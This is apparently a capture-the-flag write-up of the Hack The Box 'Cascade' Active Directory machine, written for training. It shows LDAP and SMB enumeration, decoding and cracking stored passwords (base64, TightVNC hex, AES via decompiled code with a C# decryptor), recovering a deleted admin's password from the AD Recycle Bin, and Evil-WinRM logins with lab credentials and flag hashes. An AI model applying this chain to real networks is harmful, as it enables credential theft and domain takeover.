---
layout: single
title: Cascade - Hack The Box
excerpt: "Cascade is a medium difficulty windows machine. which resembles a real-life Active Directory Attack Scenario. Initial foothold involves in getting base64 encode password of r.thompson user from ldap enumeration. With help of those credential we get VNC_Install.reg registry file from Datas.smith share on the box. I contains hex encrypted string we crack it to get s.smith creds and login as s.smith user. Next, we'll get ArkSvc user encrypted password from Audit.db from Audit$ share and we also grab all the exe and dll file from that share. which helps us to crack the encrypted string. Once we got the ArkSvc user we login to the machine and see his a part of AD Recyle Bin group and we can retrive AD deleted objects and their properties. We managed to retrive TempAdmin base64 encrypted password and we decrypt and use the same password to login as Administrator."
date: 2020-07-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-cascade/cascade_logo.jpeg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Reverse Engineering
  - Registry file
  - Active Directory
  - DnSpy
---

![](/assets/images/htb-writeup-cascade/cascade_logo.jpeg)

## Synopsis
Cascade is a medium difficulty windows machine. which resembles a real-life Active Directory Attack Scenario. Initial foothold involves in getting base64 encode password of `r.thompson` user from ldap enumeration. With help of those credential we get `VNC Install.reg` registry file from `Data\s.smith` share on the box. I contains hex encrypted string we crack it to get s.smith creds and login as `s.smith` user. Next, we'll get `ArkSvc` user encrypted password from `Audit.db` from `Audit$` share and we also grab all the `exe and dll` file from that share. which helps us to crack the encrypted string. Once we got the `ArkSvc` user we login to the machine and see his a part of `AD Recyle Bin` group and we can retrive `AD deleted objects and their properties`. We managed to retrive `TempAdmin` base64 encrypted password and we decrypt and use the same password to login as `Administrator`. 

## Skills Required
* Enumeration
* Active Directory
  
## Skills Learned
* Windows Registry files
* AD Recyle Bin
* Decompiling with DnSpy
 
---
## Enumeration
### Nmap
```java
# Nmap 7.60 scan initiated Sat Apr  4 11:42:21 2020 as: nmap -Pn -sV -sC -v -p53,88,135,139,389,445,636,3268,3269,5985,49155,49157,49158,49170 -o full.nmap cascade.htb
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.38s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-04 06:15:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49170/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-04 11:46:09
|_  start_date: 2020-04-04 09:28:38
```
`DNS` running on its default port and next thing we see is `kerberos` listening on port `88`. Soon i see `kerberos` i look for `ldap` . Upon seeing `DNS, kerberos, ldap` i assume i'm on a windows `Active Directory` box. We can see `ldap` giving up its domain name `cascade.local`.

let's look at `rpcclinet` if we can get any potential `usernames`.
```
rpcclient -U "" 10.10.10.182
Enter WORKGROUP\'s password: 
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```
This give us all the `users` present on the machine. Which is so useful to us to enumerate furthur.
### Ldap
Let's Enumerate `ldap` and see if we can find any sensitive info. 
```java
ldapsearch -x -h 10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local"

<SNIP>

sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132304542227239322
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

<SNIP>
```

Going through the `ldap` output . we see `cascadeLegacyPWD` property of `r.thompson` user. Which seems to be a `base64` encoded password. Let's decode it.
```
echo -n 'clk0bjVldmE=' |base64 -d

rY4n5eva
```
### SMB
So we got password for `r.thompson` user . Let's check this creds `r.thompson:rY4n5eva` against `SMB` and see if we can list and read any shares.
```
smbmap -u r.thompson -p 'rY4n5eva' -H 10.10.10.182

[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.182...
[+] IP: 10.10.10.182:445        Name: cascade.htb                                       
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        print$                                                  READ ONLY
        SYSVOL                                                  READ ONLY
```

The creds are valid and we're able to list the share on the machine. `Audit$` share seems to be interesting but we don't have access to it. we only have `READ ONLY` access to `Data, print$, SYSVOL`. let's start enumerating `Data` share.
```java
smbclient -U r.thompson //10.10.10.182/Data

WARNING: The "null passwords" option is deprecated
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> ls
  .                                   D        0  Mon Jan 27 08:57:34 2020
  ..                                  D        0  Mon Jan 27 08:57:34 2020
  Contractors                         D        0  Mon Jan 13 07:15:11 2020
  Finance                             D        0  Mon Jan 13 07:15:06 2020
  IT                                  D        0  Tue Jan 28 23:34:51 2020
  Production                          D        0  Mon Jan 13 07:15:18 2020
  Temps                               D        0  Mon Jan 13 07:15:15 2020

\Contractors
NT_STATUS_ACCESS_DENIED listing \Contractors\*

\Finance
NT_STATUS_ACCESS_DENIED listing \Finance\*

\IT
  .                                   D        0  Tue Jan 28 23:34:51 2020
  ..                                  D        0  Tue Jan 28 23:34:51 2020
  Email Archives                      D        0  Tue Jan 28 23:30:30 2020
  LogonAudit                          D        0  Tue Jan 28 23:34:40 2020
  Logs                                D        0  Wed Jan 29 06:23:04 2020
  Temp                                D        0  Wed Jan 29 03:36:59 2020

\Production
NT_STATUS_ACCESS_DENIED listing \Production\*

\Temps
NT_STATUS_ACCESS_DENIED listing \Temps\*

\IT\Email Archives
  .                                   D        0  Tue Jan 28 23:30:30 2020
  ..                                  D        0  Tue Jan 28 23:30:30 2020
  Meeting_Notes_June_2018.html        A     2522  Tue Jan 28 23:30:12 2020

\IT\LogonAudit
  .                                   D        0  Tue Jan 28 23:34:40 2020
  ..                                  D        0  Tue Jan 28 23:34:40 2020

\IT\Logs
  .                                   D        0  Wed Jan 29 06:23:04 2020
  ..                                  D        0  Wed Jan 29 06:23:04 2020
  Ark AD Recycle Bin                  D        0  Fri Jan 10 22:03:45 2020
  DCs                                 D        0  Wed Jan 29 06:26:00 2020

\IT\Temp
  .                                   D        0  Wed Jan 29 03:36:59 2020
  ..                                  D        0  Wed Jan 29 03:36:59 2020
  r.thompson                          D        0  Wed Jan 29 03:36:53 2020
  s.smith                             D        0  Wed Jan 29 01:30:01 2020

\IT\Logs\Ark AD Recycle Bin
  .                                   D        0  Fri Jan 10 22:03:45 2020
  ..                                  D        0  Fri Jan 10 22:03:45 2020
  ArkAdRecycleBin.log                 A     1303  Wed Jan 29 06:49:11 2020

\IT\Logs\DCs
  .                                   D        0  Wed Jan 29 06:26:00 2020
  ..                                  D        0  Wed Jan 29 06:26:00 2020
  dcdiag.log                          A     5967  Fri Jan 10 21:47:30 2020

\IT\Temp\r.thompson
  .                                   D        0  Wed Jan 29 03:36:53 2020
  ..                                  D        0  Wed Jan 29 03:36:53 2020

\IT\Temp\s.smith
  .                                   D        0  Wed Jan 29 01:30:01 2020
  ..                                  D        0  Wed Jan 29 01:30:01 2020
  VNC Install.reg                     A     2680  Wed Jan 29 00:57:44 2020
```

Looking at the share we only have access to `IT` directory . It contains few interesting files in it. Let's start with `Meeting_Notes_June_2018.html` present at `\IT\Email Archives`. looking at its contents. we see the following message interesting.
```html
<SNIP>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<SNIP>
```
It says their new production network goes live and they've created a `temporary account` to perform all tasks and its username is `TempAdmin` and its say's `password is same as admin account password`. We got a new potential username and we'll keep it aside for future use. since we're not yet aware of its password. 

Next, looking at `dcdiag.log` provides us the logs of `Directory server diagnosis` we can see box hostaname as `CASC-DC1`. Apart from this nothing seem's to be interesting. Same goes with `ArkAdRecycleBin.log` file and nothing seems to be interesting init.

## Cracking hex
Looking around we see a interesting file `VNC Install.reg` at `\IT\Temp\s.smith`. A file with the `.reg` extension is a `Windows Registry` file. It's a text-based file created by exporting values from the `Registry`. let's look at its contents.
```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

Going through the file we find password value `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f` seems to be interesting, we can clean it a lil bit to exactly look like a hex encrypted string like this `6bcf2a4b6e5aca0f` . which contains a hex encryped string. so, this might be the `password` for `s.smith` user. so we need to find a way to crack this `hex`. 

Little bit of googling helped me to find this awesome blog [crack-or-decrypt-vnc-server-encrypted-password](https://www.raymond.cc/blog/crack-or-decrypt-vnc-server-encrypted-password/). Which show couple of methods to crack encrypted password. It show a commandline tool called `vncpwn.exe` and we can pass our hex encrypted to string and it will crack it for us. let's download it and try in on my local windows box.

![](/assets/images/htb-writeup-cascade/crack.png)

It cracke our hex successfully and the password is `sT333ve2` . Now we can use `s.smith:sT333ve2` creds to login to the box using `Evil-WinRM`.
```
evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'

Evil-WinRM shell v2.3                                                                                                            
                                                                                                                                 
Info: Establishing connection to remote endpoint                                                                                 
                                                                                                                                 
*Evil-WinRM* PS C:\Users\s.smith\Desktop> hostname
CASC-DC1
*Evil-WinRM* PS C:\Users\s.smith\Desktop> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Desktop> gc user.txt
0d6b4def3ebee58df1aea588d860eb88
```
## Reversing
Trying to login into `SMB` using `s.smith` creds show us now we've `READ ONLY` access to the `Audit$` share. lets enumerate it.
```
smbmap -u s.smith -p 'sT333ve2' -H cascade.htb

[+] Finding open SMB ports....
[+] User SMB session establishd on cascade.htb...
[+] IP: cascade.htb:445 Name: cascade.htb                                       
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        print$                                                  READ ONLY
        SYSVOL                                                  READ ONLY
```
```
smbclient -U s.smith  //10.10.10.182/Audit$

Enter WORKGROUP\s.smith's password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> ls
  .                                   D        0  Wed Jan 29 23:31:26 2020
  ..                                  D        0  Wed Jan 29 23:31:26 2020
  CascAudit.exe                       A    13312  Wed Jan 29 03:16:51 2020
  CascCrypto.dll                      A    12288  Wed Jan 29 23:30:20 2020
  DB                                  D        0  Wed Jan 29 03:10:59 2020
  RunAudit.bat                        A       45  Wed Jan 29 04:59:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 12:08:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 12:08:38 2019
  x64                                 D        0  Mon Jan 27 03:55:27 2020
  x86                                 D        0  Mon Jan 27 03:55:27 2020

\DB
  .                                   D        0  Wed Jan 29 03:10:59 2020
  ..                                  D        0  Wed Jan 29 03:10:59 2020
  Audit.db                            A    24576  Wed Jan 29 03:09:24 2020

\x64
  .                                   D        0  Mon Jan 27 03:55:27 2020
  ..                                  D        0  Mon Jan 27 03:55:27 2020
  SQLite.Interop.dll                  A  1639936  Sun Oct 27 12:09:20 2019

\x86
  .                                   D        0  Mon Jan 27 03:55:27 2020
  ..                                  D        0  Mon Jan 27 03:55:27 2020
  SQLite.Interop.dll                  A  1246720  Sun Oct 27 12:04:20 2019

                13106687 blocks of size 4096. 7792389 blocks available
```

looking inside the share we find a `exe and bunch of dll` files and we also found `Audit.db` database file. Let's grab all this to our local using `smbget` and analyze them.
```
smbget -R smb://10.10.10.182/Audit$ -U s.smith
```
Let's analyse `Audit.db` file first. Doing `file` command against the `Audit.db` file tell us its a `SQLite 3.x database`.
```
file Audit.db 

Audit.db: SQLite 3.x database, last written using SQLite version 3027002
```

Now, we'll use `sqlite` and attach the `Audit.db` and look at its database and tables.
```sql
sqlite3 Audit.db 

SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .databases
main: /home/mah1ndra/projects/htb/boxes/cascade/Audit-share/DB/Audit.db

sqlite> .tables
DeletedUserAudit  Ldap              Misc            

sqlite> .schema Ldap
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);

sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

From the database we've got `ArkSvc` user pwd `BQO5l5Kj9MdErXx6Q6AGOw==` which seem's to be encrypted String . we need to finda a way to decrypt this. Let's move on with `reversing` exe and dll's using `dnSpy`.

![](/assets/images/htb-writeup-cascade/dnspy1.png)

Decompiling `CaseAudit.exe` and looking at its `Main Module`. we can clearly see the encrypted string `password` of users  is queried form database and passed to `Crypto.DecryptString()` method along with a key `c4scadek3y654321` and finally its looks like ` Crypto.DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==","c4scadek3y654321")`.

The `Crypt.DecrypString()` method  is part of `CascCrypto.dll` file. Reversing it we can clearly see the `DecryptString()` method and how its decrypting the `Encrypted String`.

![](/assets/images/htb-writeup-cascade/dnspy2.png)

Since we've `DecrypString()` function we can only use that fucntion and execute as `cs` program to decrypt our `encrypted string`. we'll remove the function decalaration and replace all aruguments with their values and our final `Decrypt.cs` looks like this.
```cs
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Rextester
{
    public class Program
    {
        public static void Main(string[] args)
        {
            String Key = "c4scadek3y654321";
           byte[] array = Convert.FromBase64String("BQO5l5Kj9MdErXx6Q6AGOw==");
                        Aes aes = Aes.Create();
                        aes.KeySize = 128;
                        aes.BlockSize = 128;
                        aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
                        aes.Mode = CipherMode.CBC;
                        aes.Key = Encoding.UTF8.GetBytes(Key);
                        string @string;
                        using (MemoryStream memoryStream = new MemoryStream(array))
                        {
                                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                                {
                                        byte[] array2 = new byte[checked(array.Length - 1 + 1)];
                                        cryptoStream.Read(array2, 0, array2.Length);
                                        @string = Encoding.UTF8.GetString(array2);
                                }
                        }
                         Console.WriteLine(@string);
        }
    }
}
```

## ArkSvc User
Executing `decrypt.cs` file give us the decrypt string of `BQO5l5Kj9MdErXx6Q6AGOw==` which is `w3lc0meFr31nd`. So, we managed to get `ArkSvc` Creds `ArkSvc:w3lc0meFr31nd`. Let's try to login with these creds using `Evil-WinRM`.
```
/opt/evil-winrm/./evil-winrm.rb -u ArkSvc -p 'w3lc0meFr31nd' -i 10.10.10.182

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc

*Evil-WinRM* PS C:\Users\arksvc\Documents> hostname
CASC-DC1
```

Next, looking at the `groups` we're part of using `whoami /groups`. `AD Recyle Bin` seems interesting since if we recall message from `Meeting_Notes_June_2018.html`. It say's they created `TempAdmin` user to perform all the `tasks` and the `account` is deleted at the end of the projects. All the deleted objects  goes into `AD Recyle Bin` for certain amount of time and they're recoverable. This is big hint to be noted . We can retrive `deleted object properties` since we're are part of `AD Recyle Bin`. 

## AD Recyle Bin
We can list all the deleted objects in AD using  `Get-ADObject` cmdlet.
```powershell
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects

<SNIP>

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

We can clearly see `TempAdmin` in the deleted objects. we can retrive all the properties on deleted objects in this case `TempAdmin` using `-Properties` flag and `-Filter` flag to `Get-ADObject` cmdlet.
```powershell
Get-ADObject -Filter 'ObjectGUID -eq "f0cc344d-31e0-4866-bceb-a842791ca059"'  -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```
From the ouput we can see `cascadeLegacyPwd` property value `YmFDVDNyMWFOMDBkbGVz` which is base64 encoded string. which represents the `TempAdmin`  password. so we can decode it to get `TempAdmin` password.
```
echo -n 'YmFDVDNyMWFOMDBkbGVz' | base64 -d

baCT3r1aN00dles
```
## Administrator
The decode string is `baCT3r1aN00dles` . so TempAdmin creds are `TempAdmin:baCT3r1aN00dles`. Since, we read that `TempAdmin` password is same as `Administrato` in `Meeting_Notes_June_2018.html` . We can login as `Administrator` with these creds `Administrator:baCT3r1aN00dles`.

```
/opt/evil-winrm/./evil-winrm.rb -u Administrator -p 'baCT3r1aN00dles' -i 10.10.10.182


*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
CASC-DC1

*Evil-WinRM* PS C:\Users\Administrator\Desktop> gc root.txt
fe4e78d4b0e51b14f11c6e15baf47e6b
```



